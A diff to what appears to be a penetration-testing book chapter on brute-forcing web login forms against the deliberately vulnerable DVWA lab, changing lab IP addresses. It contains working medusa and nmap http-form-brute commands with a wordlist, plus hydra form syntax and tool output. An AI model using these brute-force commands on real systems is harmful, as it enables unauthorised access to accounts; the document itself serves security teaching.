@@ -288,8 +288,7 @@ G> {linenos=off, lang=bash}
 G>     username=admin&password=whatever&Login=Login
 G> 
 G> From that we build our command. `^USER^` instructs hydra to use the login (`-l`) text or path to file if the upper case `-L` is used. `^PASS^` instructs hydra to use the password wordlist we provide it with with the `-P` option.
-
-{icon=bomb}
+G> 
 G> So here we go:
 G> 
 G> {linenos=off, lang=bash}
@@ -407,7 +406,7 @@ Choose your module and get more information on it:
 Against the DVWA in the OWASPBWA suite, I used the following command:
 
 {linenos=off, lang=bash}
-    medusa -h 192.168.90.60 -u admin -P /root/wordlist-cewl-output-dvwa \
+    medusa -h 192.168.56.22 -u admin -P /root/wordlist-cewl-output-dvwa \
     -M web-form -m FORM:"/dvwa/login.php" -m DENY-SIGNAL:"login.php" \
     -m FORM-DATA:"post?username=&password=&Login=Login"
 
@@ -416,7 +415,7 @@ Against the DVWA in the OWASPBWA suite, I used the following command:
 
     ERROR: The answer was NOT successfully received, understood, and accepted while trying \
     admin cats: error code  302
-    ACCOUNT CHECK: [web-form] Host: 192.168.90.60 (1 of 1, 0 complete) \
+    ACCOUNT CHECK: [web-form] Host: 192.168.56.22 (1 of 1, 0 complete) \
     User: admin (1 of 1, 0 complete) Password: cats (1 of 4 complete)
 
 I also tried with just the correct password. The issue was that Medusa was not handling the redirects properly, so you end up with a `HTTP 302`
@@ -428,10 +427,10 @@ I also tried with just the correct password. The issue was that Medusa was not h
 I think the following may have suffered from the redirect problem also. Since then I found a [few changes](http://seclists.org/nmap-dev/2014/q3/479) to this script which may have fixed it, although I have not re-tested. The following command just took too long to complete. It may have got confused with the redirect. I am not sure.
 
 {linenos=off, lang=text}
-    nmap 192.168.90.60 -p80 --script=http-form-brute --script-args \
+    nmap 192.168.56.22 -p80 --script=http-form-brute --script-args \
     'path="/dvwa/login.php", \
     method="post", \
-    hostname="192.168.90.60", \
+    hostname="192.168.56.22", \
     onfailure="login.php", \
     passvar=admin, \
     uservar=admin' -vvv -d
